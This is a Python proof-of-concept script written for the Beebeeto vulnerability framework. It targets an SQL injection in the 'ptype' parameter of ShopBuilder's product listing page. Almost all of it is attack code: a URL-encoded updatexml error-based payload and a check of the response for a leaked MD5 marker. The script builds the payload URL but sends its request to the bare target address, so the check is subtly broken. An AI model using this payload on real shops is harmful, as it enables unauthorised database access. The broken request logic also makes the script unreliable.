#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0074',
            'name': 'ShopBuilder /?m=product&s=list&ptype SQL注入漏洞 POC',
            'author': 'foundu',
            'create_date': '2015-03-30',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ShopBuilder',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['ShopBuilder漏洞', '/?m=product&s=list&ptype', 'SQL Injection', 'ShopBuilder'],
            'desc': '?m=product&s=list&ptype=0，sqli=ptype',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-080770'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = ("/?m=product&s=list&ptype=0%27%20and%201%3Dupdatexml%281%2Cconcat%280x5c%2Cmd5"
                   "%28222222%29%29%2C1%29%23")
        verify_url = url + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = requests.get(url).content
        if 'e3ceb5881a0a1fdaad01296d7554868d' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())